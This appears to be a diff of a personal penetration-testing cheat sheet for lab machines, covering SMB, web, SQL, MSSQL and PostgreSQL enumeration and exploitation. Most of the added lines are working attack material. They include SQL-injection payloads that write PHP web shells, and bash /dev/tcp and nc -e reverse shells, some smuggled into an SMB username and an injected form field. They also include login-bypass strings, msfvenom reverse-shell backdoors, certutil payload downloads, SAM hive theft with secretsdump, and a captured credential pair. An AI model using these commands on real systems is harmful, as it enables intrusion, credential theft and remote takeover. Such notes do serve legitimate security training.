@@ -36,22 +36,22 @@ Port 445 Samba
 $ nmap -p 445 vuln -oA ipadd
 $ nmap --script=smb-vuln* -oN nmap/script_smbvuln -v --min-rate 10000 -p 139,445
 $ smbmap -H ipadd
-$ smbmap -u '' -p '' -R -H 192.168.189.98
+$ smbmap -u '' -p '' -R -H IP
 $ smbclient //ipadd/dir
 $ smbclient -U '' -L //ip
-$ smbclient -L //IP -N
+$ smbclient -L //IP -N OR \\$IP
 $ smbclient -N //IP/tmp -> dir, put
 $ add [global] client min protocol=NT1
 $ smbclient -N //IP/tmp --option='client min protocol=NT1'
 $ smbclient //IP/tmp -U "./=`nohup nc -e /bin/sh IP 443`" -> run nc
-$ smbclien \\\\$IP\\dir\\
+$ smbclient \\\\$IP\\dir\\ -U user
 
 Port 80 web server
 $ dirsearch -u http://yourip, OR
-$ gobuster dir -w raft-medium txt,php/hsp,aspx -u http://yourip -t 50 -b 404,403 -o file.log
+$ gobuster dir -w raft-medium -x .txt,.php/.hsp,.aspx -u http://yourip -t 50 -b 404,403 -o file.log
 $ gobuster dns -d domain.com
 $ echo IP domain >> //et/hosts
-$	dirb domain wordlist
+$ dirb $IP:port -w wordlist
 $	gobuster -u IP -w wordlist -t 20 -x php,txt
 $	gobuster dir -u domain -w wordlist -t 50
 $	nikto -h IP
@@ -113,6 +113,38 @@ use dbname;
 show tables;
 select * tbname;
 select username,password from tbname;
+select "<?php echo shell_exec($_GET['c']);?>" into OUTFILE 'C:/wamp/www/webshell.php'
+
+sample find sql injection:
+view=request&request=log&task=query&limit=100;SELECT+'<%3fphp+system($_GET[0])%3b%3f>'+into+outfile+'/usr/share/zoneminder/www/includes/reds.php'--+-
+access:
+http://IP/zm/includes/reds.php?0=/bin/bash+-c+%27bash+-i+%3E%26+/dev/tcp/IP/80+0%3E%261%27
+
+SQL trigered:
+<username>' OR 1=1--
+'OR '' = '	Allows authentication without a valid username.
+<username>'--
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
+
+mssql:
+$help
+$enum_logins
+$exec_as_login user
+$enum_users
+$enum_db
+$use dbname
+$select * from INFORMATION_SCHEMA.TABLES;
+$select * from sysauth;
+got creds: hrapp-service:Untimed$Runny
+$SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+
+PostgreSQL:
+$ psql -U postgres -p 5437 -h IP
+pass: postgres
+$ psql$ select pg_ls_dir('./');
+$ psql$ select pg_ls_dir('/etc/passwd');
+$ psql$ COPY temp FROM '/home/wilson/local.txt';
 
 Reverse Shell:
 https://pentestmonkey.net/
@@ -129,6 +161,38 @@ hydra -I -f -L username.txt -P pass.txt $IP -s 8081 http-post-form 'burppath:use
 
 Find Email sender:
 $ less /var/mail/admin
+
+create backdoor w/ msfvenom:
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f exe > shell.exe
+$ msfvenom -p php/reverse_php LHOST=.. LPORT=.. -f raw > exploit.php
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f exe > shell.exe  -> for alwaysinstallelevated
+
+transfer file windows:
+$ certutil -split -urlcache -f http://IP/rev.exe C:\\Users\\tony\\rev.exe
+
+Transfer File Windows to Kali using server
+$smbserver.py NASA /home/kali/Documents/PG/shared -smb2support -username nasa -password nasa
+Win:
+$net use z: \\IPkali\NASA /user:nasa nasa
+$copy sam z:
+$copy system z:
+Kali:
+$secretsdump.py -system system -sam sam local
+
+change to pdf2txt: 
+$pdf2jhon .pdf > .txt
+
+if find response data like : {'code'}, please check expression injection:
+$ curl -X POST --data ‘code=5*5’ http://IP:port/verify
+$ curl -X POST --data 'code=os.system("whoami")' http://IP:port/verify
+reverse shell
+$ curl -X POST --data 'code=os.system("nc -e /bin/bash IP port")' http://IP:port/verify
+
+php 1 liner:
+change the payload to payload = '<?php system($_GET["cmd"]); ?>'
+run the exploit: python exploit.y http://$IP
+access it + ?cmd=id, reverse shell
+0=/bin/bash+-c+%27bash+-i+%3E%26+/dev/tcp/IP/80+0%3E%261%27
 
 
 
